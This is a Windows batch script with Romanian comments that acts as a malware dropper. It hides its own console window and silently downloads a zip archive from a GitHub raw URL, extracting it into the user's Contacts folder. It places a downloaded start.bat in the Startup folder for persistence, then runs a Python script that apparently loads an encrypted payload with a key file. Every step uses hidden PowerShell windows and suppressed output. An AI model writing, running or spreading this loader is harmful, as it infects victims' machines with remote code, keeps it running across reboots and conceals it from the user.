@echo off
setlocal enabledelayedexpansion

:: Ascunde fereastra cmd
if "%~1"=="" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','""%~f0""','hidden' -WindowStyle Hidden"
    exit /b
)

set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/"
set "z=%TEMP%\zo.zip"
set "d=%USERPROFILE%\Contacts\zo"
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"

:: Crează directorul țintă
if not exist "%d%" mkdir "%d%" >nul 2>&1

:: Descarcă zo.zip (silent)
powershell -WindowStyle Hidden -Command "
try {
    $wc = New-Object Net.WebClient
    $wc.DownloadFile('%site_url%zo.zip', '%z%')
} catch { exit 1 }
"

:: Extrage arhiva (silent)
powershell -WindowStyle Hidden -Command "
try {
    Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force
    Remove-Item '%z%' -Force
} catch { exit 1 }
"

:: Descarcă start.bat în startup (silent)
powershell -WindowStyle Hidden -Command "
try {
    $wc = New-Object Net.WebClient
    $wc.DownloadFile('%site_url%start.bat', '%s%')
} catch { exit 1 }
"

:: Rulează script Python (silent)
cd /d "%d%" >nul 2>&1
python.exe sh.py -i voo.bin -k x.txt >nul 2>&1

:: Descarcă fișier rezultat (silent)
if !errorlevel!==0 (
    powershell -WindowStyle Hidden -Command "
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile('%site_url%a.txt', '%TEMP%\a.txt')
    } catch { exit 1 }
    "
) else (
    powershell -WindowStyle Hidden -Command "
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile('%site_url%b.txt', '%TEMP%\b.txt')
    } catch { exit 1 }
    "
)

exit /b
